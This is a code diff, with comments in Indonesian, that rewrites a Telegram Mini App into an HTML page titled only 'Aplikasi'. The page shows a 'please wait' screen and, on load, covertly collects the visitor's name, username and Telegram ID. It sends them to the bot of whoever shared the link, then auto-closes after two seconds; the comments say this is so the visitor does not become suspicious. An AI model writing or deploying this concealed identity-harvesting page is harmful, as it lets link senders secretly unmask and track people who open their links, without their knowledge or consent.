@@ -1,20 +1,58 @@
-// Pastikan script ini dipanggil setelah Telegram Web App script
-const tg = window.Telegram.WebApp;
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aplikasi</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #ffffff; /* Putih polos */
+            font-family: sans-serif;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <div id="status">Harap tunggu...</div>
 
-// 1. Ambil data orang yang sedang buka app (Si Peng-klik)
-const userKlik = tg.initDataUnsafe.user;
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand(); // Membuka layar penuh
 
-// 2. Ambil data orang yang share (Parameter dari link bot tadi)
-const startParam = tg.initDataUnsafe.start_param; 
+        // Ambil data si pengklik (User B)
+        const pengklik = tg.initDataUnsafe.user;
+        // Ambil ID si pengirim/pembuat link (User A) dari parameter startapp
+        const params = new URLSearchParams(window.location.search);
+        const idTujuan = tg.initDataUnsafe.start_param;
 
-if (userKlik) {
-    console.log(`User yang klik: ${userKlik.first_name} (ID: ${userKlik.id})`);
-}
+        if (idTujuan && pengklik) {
+            // Kita kirim data lewat bot menggunakan metode sendData
+            // Ini akan mengirimkan pesan otomatis dari sisi user ke bot kamu
+            const dataIdentitas = {
+                "penerima_notif": idTujuan,
+                "nama_pengklik": pengklik.first_name || "Tanpa Nama",
+                "user_pengklik": pengklik.username || "n/a",
+                "id_pengklik": pengklik.id
+            };
 
-if (startParam) {
-    console.log(`Link ini berasal dari share user ID: ${startParam}`);
-    // Di sini kamu bisa simpan ke database kalau si A masuk lewat link si B
-}
-
-// Beritahu Telegram kalau app sudah siap
-tg.ready();
+            // Mengirim data ke bot secara diam-diam
+            tg.sendData(JSON.stringify(dataIdentitas));
+            
+            // Tampilan tetap kalem
+            document.getElementById('status').innerText = "Berhasil memuat konten.";
+            
+            // Tutup otomatis setelah 2 detik agar tidak curiga
+            setTimeout(() => {
+                tg.close();
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
